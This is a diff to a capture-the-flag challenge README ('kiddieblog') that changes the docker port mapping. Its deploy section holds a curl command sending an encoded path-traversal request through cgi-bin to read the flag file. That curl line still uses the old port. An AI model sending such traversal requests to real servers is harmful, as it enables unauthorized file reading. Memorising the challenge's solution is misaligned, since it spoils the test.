@@ -17,7 +17,7 @@ __Hints__:
 * Зачекайка свеженькие proof of concept 
 
 __Deploy__: 
-* `docker build -t kiddieblog .; docker run -dp 80:80 --name kiddieblog kiddieblog`
+* `docker build -t kiddieblog .; docker run -dp 8081:8081 --name kiddieblog kiddieblog`
 * `curl "http://localhost:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/easterEgg/flag.txt"`
 * `docker stop kiddieblog && docker rm kiddieblog`
 
